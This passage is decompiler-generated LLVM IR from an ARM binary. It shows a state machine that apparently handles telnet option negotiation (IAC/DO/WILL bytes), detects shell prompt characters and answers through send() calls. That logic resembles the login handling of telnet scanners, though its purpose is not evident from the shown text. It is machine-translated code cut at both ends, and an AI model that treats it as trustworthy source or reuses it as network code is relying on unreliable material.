  %v2_1088c = inttoptr i32 %v1_1088c to i32*
  %v3_1088c = load i32, i32* %v2_1088c, align 4
  store i32 %v3_1088c, i32* %r2.global-to-local, align 4
  %v1_10890 = add i32 %v3_1088c, -2
  store i32 %v1_10890, i32* %r3.global-to-local, align 4
  %v7_10894 = icmp eq i32 %v1_10890, 8
  store i1 %v7_10894, i1* %cpsr_z.global-to-local, align 1
  %v5_10898 = and i32 %v1_10890, 1073741824
  %v6_10898 = icmp ne i32 %v5_10898, 0
  store i1 %v6_10898, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_1088c, label %dec_label_pc_1080c.loopexit [
    i32 2, label %dec_label_pc_108c4
    i32 3, label %dec_label_pc_109a8
    i32 4, label %dec_label_pc_10a50
    i32 5, label %dec_label_pc_10ae8
    i32 6, label %dec_label_pc_10c10
    i32 7, label %dec_label_pc_10ed4
    i32 8, label %dec_label_pc_10d6c
    i32 9, label %dec_label_pc_10e20
    i32 10, label %dec_label_pc_10cc4
  ]

dec_label_pc_108c4:                               ; preds = %dec_label_pc_1088c
  %v1_108c4 = add i32 %v0_1088c, 24
  %v2_108c4 = inttoptr i32 %v1_108c4 to i32*
  %v3_108c4 = load i32, i32* %v2_108c4, align 4
  store i32 %v3_108c4, i32* %ip.global-to-local, align 4
  %v0_108c8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_108c8, i32* @r5, align 4
  store i32 0, i32* @r7, align 4
  store i32 -4, i32* %sl.global-to-local, align 4
  %v1_108d4 = add i32 %v0_1088c, 29
  store i32 %v1_108d4, i32* @r4, align 4
  %v3_108d8119 = icmp eq i32 %v3_108c4, 0
  store i1 %v3_108d8119, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_108d8119, i1* %cpsr_z.global-to-local, align 1
  %v6_108dc126 = icmp sgt i32 %v3_108c4, 0
  br i1 %v6_108dc126, label %dec_label_pc_108e0.preheader, label %dec_label_pc_10998.thread

dec_label_pc_10998.thread:                        ; preds = %dec_label_pc_108c4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1080c.loopexit

dec_label_pc_108d8.loopexit:                      ; preds = %dec_label_pc_108f8
  %v2_10900 = add i32 %v1_10900, 2
  store i32 %v2_10900, i32* @r5, align 4
  %v2_10904 = add i32 %v1_10904, 2
  store i32 %v2_10904, i32* @r4, align 4
  %v2_10908 = add i32 %v1_10908, 2
  store i32 %v2_10908, i32* @r7, align 4
  %v3_108d8 = icmp uge i32 %v2_10908, %v1_108d8
  store i1 %v3_108d8, i1* %cpsr_c.global-to-local, align 1
  %v9_108d8 = icmp eq i32 %v2_10908, %v1_108d8
  store i1 %v9_108d8, i1* %cpsr_z.global-to-local, align 1
  %v6_108dc = icmp slt i32 %v2_10908, %v1_108d8
  br i1 %v6_108dc, label %dec_label_pc_108e0.preheader, label %dec_label_pc_10988

dec_label_pc_108e0.preheader:                     ; preds = %dec_label_pc_108c4, %dec_label_pc_108d8.loopexit
  %v6_10990199 = phi i32 [ %v6_10990200, %dec_label_pc_108d8.loopexit ], [ %v0_1088c, %dec_label_pc_108c4 ]
  %v1_10908189 = phi i32 [ %v2_10908, %dec_label_pc_108d8.loopexit ], [ 0, %dec_label_pc_108c4 ]
  %v1_10900187 = phi i32 [ %v2_10900, %dec_label_pc_108d8.loopexit ], [ %v0_108c8, %dec_label_pc_108c4 ]
  %v1_108ec185 = phi i32 [ %v1_108d8, %dec_label_pc_108d8.loopexit ], [ %v3_108c4, %dec_label_pc_108c4 ]
  %v0_108e0183 = phi i32 [ %v2_10904, %dec_label_pc_108d8.loopexit ], [ %v1_108d4, %dec_label_pc_108c4 ]
  br label %dec_label_pc_108e0

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108e0.preheader, %dec_label_pc_10968
  %v6_10990200 = phi i32 [ %v6_10990199, %dec_label_pc_108e0.preheader ], [ %v0_10970, %dec_label_pc_10968 ]
  %v1_10908 = phi i32 [ %v1_10908189, %dec_label_pc_108e0.preheader ], [ %v1_10974, %dec_label_pc_10968 ]
  %v1_10900 = phi i32 [ %v1_10900187, %dec_label_pc_108e0.preheader ], [ %v1_1097c, %dec_label_pc_10968 ]
  %v1_108d8 = phi i32 [ %v1_108ec185, %dec_label_pc_108e0.preheader ], [ %v3_10970, %dec_label_pc_10968 ]
  %v1_10904 = phi i32 [ %v0_108e0183, %dec_label_pc_108e0.preheader ], [ %v1_10980, %dec_label_pc_10968 ]
  %v1_108e0 = add i32 %v1_10904, -1
  %v2_108e0 = inttoptr i32 %v1_108e0 to i8*
  %v3_108e0 = load i8, i8* %v2_108e0, align 1
  %v4_108e0 = zext i8 %v3_108e0 to i32
  store i32 %v4_108e0, i32* %r3.global-to-local, align 4
  %v2_108e4 = icmp eq i8 %v3_108e0, -1
  store i1 %v2_108e4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_108e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108e4, label %dec_label_pc_108ec, label %dec_label_pc_10988

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108e0
  %v0_108ec = load i32, i32* %r8.global-to-local, align 4
  %v2_108ec = add i32 %v0_108ec, %v1_108d8
  store i32 %v2_108ec, i32* %r2.global-to-local, align 4
  %v3_108f0 = icmp uge i32 %v2_108ec, %v1_10904
  store i1 %v3_108f0, i1* %cpsr_c.global-to-local, align 1
  %v9_108f0 = icmp eq i32 %v2_108ec, %v1_10904
  store i1 %v9_108f0, i1* %cpsr_z.global-to-local, align 1
  %v2_108f4 = xor i1 %v3_108f0, true
  %v3_108f4 = or i1 %v9_108f0, %v2_108f4
  br i1 %v3_108f4, label %dec_label_pc_10988, label %dec_label_pc_108f8

dec_label_pc_108f8:                               ; preds = %dec_label_pc_108ec
  %v1_108f8 = inttoptr i32 %v1_10904 to i8*
  %v2_108f8 = load i8, i8* %v1_108f8, align 1
  %v3_108f8 = zext i8 %v2_108f8 to i32
  store i32 %v3_108f8, i32* %r3.global-to-local, align 4
  %v2_108fc = icmp eq i8 %v2_108f8, -1
  store i1 %v2_108fc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_108fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108fc, label %dec_label_pc_108d8.loopexit, label %dec_label_pc_10910

dec_label_pc_10910:                               ; preds = %dec_label_pc_108f8
  %v2_10910 = icmp ugt i8 %v2_108f8, -4
  store i1 %v2_10910, i1* %cpsr_c.global-to-local, align 1
  %v7_10910 = icmp eq i8 %v2_108f8, -3
  store i1 %v7_10910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10910, label %dec_label_pc_10f88, label %dec_label_pc_10918

dec_label_pc_10918:                               ; preds = %dec_label_pc_10910
  %v1_10918 = add i32 %v1_10900, 2
  store i32 %v1_10918, i32* %r3.global-to-local, align 4
  %v3_1091c = icmp uge i32 %v2_108ec, %v1_10918
  store i1 %v3_1091c, i1* %cpsr_c.global-to-local, align 1
  %v9_1091c = icmp eq i32 %v2_108ec, %v1_10918
  store i1 %v9_1091c, i1* %cpsr_z.global-to-local, align 1
  %v2_10920 = xor i1 %v3_1091c, true
  %v3_10920 = or i1 %v9_1091c, %v2_10920
  br i1 %v3_10920, label %dec_label_pc_10988, label %dec_label_pc_10924

dec_label_pc_10924:                               ; preds = %dec_label_pc_10fe0, %bb370, %bb369, %dec_label_pc_10918
  %v0_10924 = load i32, i32* @r4, align 4
  %v1_10924 = inttoptr i32 %v0_10924 to i8*
  %v2_10924 = load i8, i8* %v1_10924, align 1
  %v3_10924 = zext i8 %v2_10924 to i32
  store i32 %v3_10924, i32* %r3.global-to-local, align 4
  %v2_10928 = icmp ugt i8 %v2_10924, -4
  store i1 %v2_10928, i1* %cpsr_c.global-to-local, align 1
  %v7_10928 = icmp eq i8 %v2_10924, -3
  store i1 %v7_10928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10928, label %bb348, label %dec_label_pc_10934

bb348:                                            ; preds = %dec_label_pc_10924
  %v1_1092c = load i32, i32* %sl.global-to-local, align 4
  %v2_1092c = trunc i32 %v1_1092c to i8
  store i8 %v2_1092c, i8* %v1_10924, align 1
  %v0_10930.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10930.pr, label %.thread88, label %.dec_label_pc_10934_crit_edge

.dec_label_pc_10934_crit_edge:                    ; preds = %bb348
  %v0_10934.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10934

dec_label_pc_10934:                               ; preds = %.dec_label_pc_10934_crit_edge, %dec_label_pc_10924
  %v0_10934 = phi i32 [ %v0_10934.pre, %.dec_label_pc_10934_crit_edge ], [ %v3_10924, %dec_label_pc_10924 ]
  %v2_10934 = icmp ugt i32 %v0_10934, 250
  store i1 %v2_10934, i1* %cpsr_c.global-to-local, align 1
  %v7_10934 = icmp eq i32 %v0_10934, 251
  store i1 %v7_10934, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10934, label %bb349, label %.thread88

bb349:                                            ; preds = %dec_label_pc_10934
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_1093c = load i32, i32* @r4, align 4
  %v4_1093c = inttoptr i32 %v3_1093c to i8*
  store i8 -3, i8* %v4_1093c, align 1
  br label %.thread88

.thread88:                                        ; preds = %dec_label_pc_10934, %bb348, %bb349
  %v0_10940 = load i32, i32* @r4, align 4
  %v1_10940 = add i32 %v0_10940, 1
  %v2_10940 = inttoptr i32 %v1_10940 to i8*
  %v3_10940 = load i8, i8* %v2_10940, align 1
  %v4_10940 = zext i8 %v3_10940 to i32
  store i32 %v4_10940, i32* %r3.global-to-local, align 4
  %v2_10944 = icmp ugt i8 %v3_10940, -4
  store i1 %v2_10944, i1* %cpsr_c.global-to-local, align 1
  %v7_10944 = icmp eq i8 %v3_10940, -3
  store i1 %v7_10944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10944, label %bb350, label %dec_label_pc_10950

bb350:                                            ; preds = %.thread88
  %v1_10948 = load i32, i32* %sl.global-to-local, align 4
  %v2_10948 = trunc i32 %v1_10948 to i8
  store i8 %v2_10948, i8* %v2_10940, align 1
  %v0_1094c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1094c.pr, label %.thread90, label %.dec_label_pc_10950_crit_edge

.dec_label_pc_10950_crit_edge:                    ; preds = %bb350
  %v0_10950.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %.dec_label_pc_10950_crit_edge, %.thread88
  %v0_10950 = phi i32 [ %v0_10950.pre, %.dec_label_pc_10950_crit_edge ], [ %v4_10940, %.thread88 ]
  %v2_10950 = icmp ugt i32 %v0_10950, 250
  store i1 %v2_10950, i1* %cpsr_c.global-to-local, align 1
  %v7_10950 = icmp eq i32 %v0_10950, 251
  store i1 %v7_10950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10950, label %bb351, label %.thread90

bb351:                                            ; preds = %dec_label_pc_10950
  store i32 -3, i32* %ip.global-to-local, align 4
  %v3_10958 = load i32, i32* @r4, align 4
  %v4_10958 = add i32 %v3_10958, 1
  %v5_10958 = inttoptr i32 %v4_10958 to i8*
  store i8 -3, i8* %v5_10958, align 1
  br label %.thread90

.thread90:                                        ; preds = %dec_label_pc_10950, %bb350, %bb351
  %v0_1095c = load i32, i32* @r6, align 4
  %v1_1095c = add i32 %v0_1095c, 4
  %v2_1095c = inttoptr i32 %v1_1095c to i32*
  %v3_1095c = load i32, i32* %v2_1095c, align 4
  store i32 %v3_1095c, i32* %r0.global-to-local, align 4
  %v0_10960 = load i32, i32* @r5, align 4
  br label %dec_label_pc_10968

dec_label_pc_10968:                               ; preds = %dec_label_pc_11154, %.thread90
  %storemerge8 = phi i32 [ %v2_10fa4, %dec_label_pc_11154 ], [ %v0_10960, %.thread90 ]
  %storemerge = phi i32 [ 9, %dec_label_pc_11154 ], [ 3, %.thread90 ]
  store i32 %storemerge8, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1096c = inttoptr i32 %storemerge8 to i32*
  %v5_1096c = call i32 @send(i32 16384, i32* %v4_1096c, i32 %storemerge, i32 16384)
  store i32 %v5_1096c, i32* %r0.global-to-local, align 4
  %v0_10970 = load i32, i32* @r6, align 4
  %v1_10970 = add i32 %v0_10970, 24
  %v2_10970 = inttoptr i32 %v1_10970 to i32*
  %v3_10970 = load i32, i32* %v2_10970, align 4
  store i32 %v3_10970, i32* %ip.global-to-local, align 4
  %v0_10974 = load i32, i32* @r7, align 4
  %v1_10974 = add i32 %v0_10974, 3
  store i32 %v1_10974, i32* @r7, align 4
  %v3_10978 = icmp uge i32 %v1_10974, %v3_10970
  store i1 %v3_10978, i1* %cpsr_c.global-to-local, align 1
  %v9_10978 = icmp eq i32 %v1_10974, %v3_10970
  store i1 %v9_10978, i1* %cpsr_z.global-to-local, align 1
  %v0_1097c = load i32, i32* @r5, align 4
  %v1_1097c = add i32 %v0_1097c, 3
  store i32 %v1_1097c, i32* @r5, align 4
  %v0_10980 = load i32, i32* @r4, align 4
  %v1_10980 = add i32 %v0_10980, 3
  store i32 %v1_10980, i32* @r4, align 4
  %v5_10984 = icmp slt i32 %v1_10974, %v3_10970
  br i1 %v5_10984, label %dec_label_pc_108e0, label %dec_label_pc_10988

dec_label_pc_10988:                               ; preds = %dec_label_pc_108d8.loopexit, %dec_label_pc_108e0, %dec_label_pc_10968, %dec_label_pc_10918, %dec_label_pc_108ec, %dec_label_pc_10f88.dec_label_pc_10988.loopexit_crit_edge
  %v6_10990 = phi i32 [ %v0_10fb0, %dec_label_pc_10f88.dec_label_pc_10988.loopexit_crit_edge ], [ %v6_10990200, %dec_label_pc_108e0 ], [ %v0_10970, %dec_label_pc_10968 ], [ %v6_10990200, %dec_label_pc_10918 ], [ %v6_10990200, %dec_label_pc_108ec ], [ %v6_10990200, %dec_label_pc_108d8.loopexit ]
  %v0_10988 = phi i32 [ %v0_10988.pre.pre, %dec_label_pc_10f88.dec_label_pc_10988.loopexit_crit_edge ], [ %v1_10908, %dec_label_pc_108e0 ], [ %v1_10974, %dec_label_pc_10968 ], [ %v1_10908, %dec_label_pc_10918 ], [ %v1_10908, %dec_label_pc_108ec ], [ %v2_10908, %dec_label_pc_108d8.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10988 = icmp eq i32 %v0_10988, 0
  store i1 %v2_10988, i1* %cpsr_z.global-to-local, align 1
  %tmp352 = icmp slt i32 %v0_10988, 1
  br i1 %tmp352, label %dec_label_pc_10998, label %.thread236

.thread236:                                       ; preds = %dec_label_pc_10988
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_10990 = add i32 %v6_10990, 12
  %v8_10990 = inttoptr i32 %v7_10990 to i32*
  store i32 3, i32* %v8_10990, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10998:                               ; preds = %dec_label_pc_10988, %dec_label_pc_10f28, %dec_label_pc_10e74, %dec_label_pc_10dc0, %dec_label_pc_11090, %dec_label_pc_10c64, %dec_label_pc_10b3c, %dec_label_pc_10aa4, %dec_label_pc_10a0c
  %v0_10998 = phi i32 [ %v1_10f1c, %dec_label_pc_10f28 ], [ %v1_10e68, %dec_label_pc_10e74 ], [ %v1_10db4, %dec_label_pc_10dc0 ], [ %v0_11088, %dec_label_pc_11090 ], [ %v1_10c58, %dec_label_pc_10c64 ], [ %v1_10b30, %dec_label_pc_10b3c ], [ %v0_10aa4, %dec_label_pc_10aa4 ], [ %v0_10a0c, %dec_label_pc_10a0c ], [ %v0_10988, %dec_label_pc_10988 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10998 = icmp eq i32 %v0_10998, 0
  store i1 %v2_10998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10998, label %dec_label_pc_1080c.loopexit, label %dec_label_pc_109a0

dec_label_pc_109a0:                               ; preds = %dec_label_pc_10998
  %v0_109a0 = load i32, i32* @r6, align 4
  %v1_109a0 = add i32 %v0_109a0, 24
  %v2_109a0 = inttoptr i32 %v1_109a0 to i32*
  %v3_109a0 = load i32, i32* %v2_109a0, align 4
  store i32 %v3_109a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10d48

dec_label_pc_109a8:                               ; preds = %dec_label_pc_1088c
  %v1_109a8 = add i32 %v0_1088c, 24
  %v2_109a8 = inttoptr i32 %v1_109a8 to i32*
  %v3_109a8 = load i32, i32* %v2_109a8, align 4
  store i32 %v3_109a8, i32* %r3.global-to-local, align 4
  %v1_109ac = add i32 %v3_109a8, -1
  store i32 %v1_109ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_109b0 = icmp eq i32 %v1_109ac, 0
  store i1 %v2_109b0, i1* %cpsr_z.global-to-local, align 1
  %v5_109b4 = icmp sgt i32 %v1_109ac, 0
  br i1 %v5_109b4, label %dec_label_pc_109dc, label %dec_label_pc_1076c

dec_label_pc_109bc:                               ; preds = %bb353
  %v2_109bc = icmp ugt i8 %v3_109e0, 35
  store i1 %v2_109bc, i1* %cpsr_c.global-to-local, align 1
  %v7_109bc = icmp eq i8 %v3_109e0, 36
  store i1 %v7_109bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109bc, label %dec_label_pc_109f0, label %dec_label_pc_109c4

dec_label_pc_109c4:                               ; preds = %dec_label_pc_109bc
  %v2_109c4 = icmp ugt i8 %v3_109e0, 34
  store i1 %v2_109c4, i1* %cpsr_c.global-to-local, align 1
  %v7_109c4 = icmp eq i8 %v3_109e0, 35
  store i1 %v7_109c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109c4, label %dec_label_pc_109f0, label %dec_label_pc_109cc

dec_label_pc_109cc:                               ; preds = %dec_label_pc_109c4
  %v2_109cc = icmp ugt i8 %v3_109e0, 36
  store i1 %v2_109cc, i1* %cpsr_c.global-to-local, align 1
  %v7_109cc = icmp eq i8 %v3_109e0, 37
  store i1 %v7_109cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109cc, label %dec_label_pc_109f0, label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %dec_label_pc_109cc
  %v1_109d4 = add i32 %v0_109f0, -1
  store i32 %v1_109d4, i32* %r0.global-to-local, align 4
  %v2_109d4 = icmp ne i32 %v0_109f0, 0
  store i1 %v2_109d4, i1* %cpsr_c.global-to-local, align 1
  %v7_109d4 = icmp eq i32 %v0_109f0, 1
  store i1 %v7_109d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109d4, label %dec_label_pc_1076c, label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109a8, %dec_label_pc_109d4
  %v0_109f0 = phi i32 [ %v1_109d4, %dec_label_pc_109d4 ], [ %v1_109ac, %dec_label_pc_109a8 ]
  %v2_109dc = add i32 %v0_109f0, %v0_1088c
  store i32 %v2_109dc, i32* %r3.global-to-local, align 4
  %v1_109e0 = add i32 %v2_109dc, 28
  %v2_109e0 = inttoptr i32 %v1_109e0 to i8*
  %v3_109e0 = load i8, i8* %v2_109e0, align 1
  %v4_109e0 = zext i8 %v3_109e0 to i32
  store i32 %v4_109e0, i32* %r3.global-to-local, align 4
  %v2_109e4 = icmp ugt i8 %v3_109e0, 61
  store i1 %v2_109e4, i1* %cpsr_c.global-to-local, align 1
  %v7_109e4 = icmp eq i8 %v3_109e0, 62
  store i1 %v7_109e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109e4, label %dec_label_pc_109f0, label %bb353

bb353:                                            ; preds = %dec_label_pc_109dc
  %v3_109e8 = icmp ugt i8 %v3_109e0, 57
  store i1 %v3_109e8, i1* %cpsr_c.global-to-local, align 1
  %v8_109e8 = icmp eq i8 %v3_109e0, 58
  store i1 %v8_109e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_109e8, label %dec_label_pc_109f0, label %dec_label_pc_109bc

dec_label_pc_109f0:                               ; preds = %dec_label_pc_109dc, %bb353, %dec_label_pc_109cc, %dec_label_pc_109c4, %dec_label_pc_109bc
  %v1_109f0 = add i32 %v0_109f0, 1
  store i32 %v1_109f0, i32* @r7, align 4
  %v2_109f4 = icmp eq i32 %v1_109f0, -1
  store i1 %v2_109f4, i1* %cpsr_c.global-to-local, align 1
  %v7_109f4 = icmp eq i32 %v0_109f0, -2
  store i1 %v7_109f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109f4, label %dec_label_pc_1076c, label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %dec_label_pc_109f0
  store i32 29, i32* %r0.global-to-local, align 4
  %v1_10a00 = call i32 @function_112dc(i32 29)
  store i32 30, i32* %r0.global-to-local, align 4
  %v1_10a08 = call i32 @function_112dc(i32 30)
  store i32 %v1_10a08, i32* %r0.global-to-local, align 4
  %v0_10a0c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10a0c

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_107f4, %dec_label_pc_109fc
  %v0_10a0c = phi i32 [ %v0_10804, %dec_label_pc_107f4 ], [ %v0_10a0c.pre, %dec_label_pc_109fc ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a0c = icmp eq i32 %v0_10a0c, 0
  store i1 %v2_10a0c, i1* %cpsr_z.global-to-local, align 1
  %tmp354 = icmp slt i32 %v0_10a0c, 1
  br i1 %tmp354, label %dec_label_pc_10998, label %dec_label_pc_10a14

dec_label_pc_10a14:                               ; preds = %dec_label_pc_10a0c
  %v0_10a14 = load i32, i32* @r6, align 4
  %v1_10a14 = inttoptr i32 %v0_10a14 to i32*
  %v2_10a14 = load i32, i32* %v1_10a14, align 4
  store i32 %v2_10a14, i32* %r3.global-to-local, align 4
  %v1_10a18 = add i32 %v0_10a14, 4
  %v2_10a18 = inttoptr i32 %v1_10a18 to i32*
  %v3_10a18 = load i32, i32* %v2_10a18, align 4
  store i32 %v3_10a18, i32* %r0.global-to-local, align 4
  %v1_10a1c = add i32 %v2_10a14, 12
  %v2_10a1c = inttoptr i32 %v1_10a1c to i8*
  %v3_10a1c = load i8, i8* %v2_10a1c, align 1
  %v4_10a1c = zext i8 %v3_10a1c to i32
  store i32 %v4_10a1c, i32* %r2.global-to-local, align 4
  %v1_10a20 = inttoptr i32 %v2_10a14 to i32*
  %v2_10a20 = load i32, i32* %v1_10a20, align 4
  store i32 %v2_10a20, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10a28 = inttoptr i32 %v2_10a20 to i32*
  %v5_10a28 = call i32 @send(i32 %v3_10a18, i32* %v4_10a28, i32 %v4_10a1c, i32 16384)
  store i32 %v5_10a28, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10a30 = load i32, i32* @r6, align 4
  %v1_10a30 = add i32 %v0_10a30, 4
  %v2_10a30 = inttoptr i32 %v1_10a30 to i32*
  %v3_10a30 = load i32, i32* %v2_10a30, align 4
  store i32 %v3_10a30, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1230c.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10a3c = call i32 @send(i32 %v3_10a30, i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), i32 2, i32 16384)
  store i32 %v5_10a3c, i32* %r0.global-to-local, align 4
  %v0_10a40 = load i32, i32* @r6, align 4
  %v1_10a40 = add i32 %v0_10a40, 24
  %v2_10a40 = inttoptr i32 %v1_10a40 to i32*
  %v3_10a40 = load i32, i32* %v2_10a40, align 4
  store i32 %v3_10a40, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_10a48 = add i32 %v0_10a40, 12
  %v3_10a48 = inttoptr i32 %v2_10a48 to i32*
  store i32 4, i32* %v3_10a48, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10a50:                               ; preds = %dec_label_pc_1088c
  %v1_10a50 = add i32 %v0_1088c, 24
  %v2_10a50 = inttoptr i32 %v1_10a50 to i32*
  %v3_10a50 = load i32, i32* %v2_10a50, align 4
  store i32 %v3_10a50, i32* %r3.global-to-local, align 4
  %v1_10a54 = add i32 %v3_10a50, -1
  store i32 %v1_10a54, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a58 = icmp eq i32 %v1_10a54, 0
  store i1 %v2_10a58, i1* %cpsr_z.global-to-local, align 1
  %v5_10a5c = icmp sgt i32 %v1_10a54, 0
  br i1 %v5_10a5c, label %dec_label_pc_10a7c, label %dec_label_pc_10ff0

dec_label_pc_10a64:                               ; preds = %bb355
  %v2_10a64 = icmp ugt i8 %v3_10a80, 35
  store i1 %v2_10a64, i1* %cpsr_c.global-to-local, align 1
  %v7_10a64 = icmp eq i8 %v3_10a80, 36
  store i1 %v7_10a64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a64, label %dec_label_pc_10a90, label %dec_label_pc_10a6c

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a64
  %v2_10a6c = icmp ugt i8 %v3_10a80, 34
  store i1 %v2_10a6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a6c = icmp eq i8 %v3_10a80, 35
  store i1 %v7_10a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a6c, label %dec_label_pc_10a90, label %dec_label_pc_10a74

dec_label_pc_10a74:                               ; preds = %dec_label_pc_10a6c
  %v1_10a74 = add i32 %v0_10a90, -1
  store i32 %v1_10a74, i32* %r0.global-to-local, align 4
  %v2_10a74 = icmp ne i32 %v0_10a90, 0
  store i1 %v2_10a74, i1* %cpsr_c.global-to-local, align 1
  %v7_10a74 = icmp eq i32 %v0_10a90, 1
  store i1 %v7_10a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a74, label %dec_label_pc_10ff0, label %dec_label_pc_10a7c

dec_label_pc_10a7c:                               ; preds = %dec_label_pc_10a50, %dec_label_pc_10a74
  %v0_10a90 = phi i32 [ %v1_10a74, %dec_label_pc_10a74 ], [ %v1_10a54, %dec_label_pc_10a50 ]
  %v2_10a7c = add i32 %v0_10a90, %v0_1088c
  store i32 %v2_10a7c, i32* %r3.global-to-local, align 4
  %v1_10a80 = add i32 %v2_10a7c, 28
  %v2_10a80 = inttoptr i32 %v1_10a80 to i8*
  %v3_10a80 = load i8, i8* %v2_10a80, align 1
  %v4_10a80 = zext i8 %v3_10a80 to i32
  store i32 %v4_10a80, i32* %r3.global-to-local, align 4
  %v2_10a84 = icmp ugt i8 %v3_10a80, 61
  store i1 %v2_10a84, i1* %cpsr_c.global-to-local, align 1
  %v7_10a84 = icmp eq i8 %v3_10a80, 62
  store i1 %v7_10a84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a84, label %dec_label_pc_10a90, label %bb355

bb355:                                            ; preds = %dec_label_pc_10a7c
  %v3_10a88 = icmp ugt i8 %v3_10a80, 57
  store i1 %v3_10a88, i1* %cpsr_c.global-to-local, align 1
  %v8_10a88 = icmp eq i8 %v3_10a80, 58
  store i1 %v8_10a88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10a88, label %dec_label_pc_10a90, label %dec_label_pc_10a64

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a7c, %bb355, %dec_label_pc_10a6c, %dec_label_pc_10a64
  %v1_10a90 = add i32 %v0_10a90, 1
  store i32 %v1_10a90, i32* @r7, align 4
  %v2_10a94 = icmp eq i32 %v1_10a90, -1
  store i1 %v2_10a94, i1* %cpsr_c.global-to-local, align 1
  %v7_10a94 = icmp eq i32 %v0_10a90, -2
  store i1 %v7_10a94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10a94, label %dec_label_pc_10ff0, label %dec_label_pc_10a9c

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a90
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_10aa0 = call i32 @function_112dc(i32 28)
  store i32 %v1_10aa0, i32* %r0.global-to-local, align 4
  %v0_10aa4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10aa4

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_11030, %dec_label_pc_10a9c
  %v0_10aa4 = phi i32 [ %v0_11038, %dec_label_pc_11030 ], [ %v0_10aa4.pre, %dec_label_pc_10a9c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10aa4 = icmp eq i32 %v0_10aa4, 0
  store i1 %v2_10aa4, i1* %cpsr_z.global-to-local, align 1
  %tmp356 = icmp slt i32 %v0_10aa4, 1
  br i1 %tmp356, label %dec_label_pc_10998, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10aa4
  %v0_10aac = load i32, i32* @r6, align 4
  %v1_10aac = inttoptr i32 %v0_10aac to i32*
  %v2_10aac = load i32, i32* %v1_10aac, align 4
  store i32 %v2_10aac, i32* %r3.global-to-local, align 4
  %v1_10ab0 = add i32 %v0_10aac, 4
  %v2_10ab0 = inttoptr i32 %v1_10ab0 to i32*
  %v3_10ab0 = load i32, i32* %v2_10ab0, align 4
  store i32 %v3_10ab0, i32* %r0.global-to-local, align 4
  %v1_10ab4 = add i32 %v2_10aac, 13
  %v2_10ab4 = inttoptr i32 %v1_10ab4 to i8*
  %v3_10ab4 = load i8, i8* %v2_10ab4, align 1
  %v4_10ab4 = zext i8 %v3_10ab4 to i32
  store i32 %v4_10ab4, i32* %r2.global-to-local, align 4
  %v1_10ab8 = add i32 %v2_10aac, 4
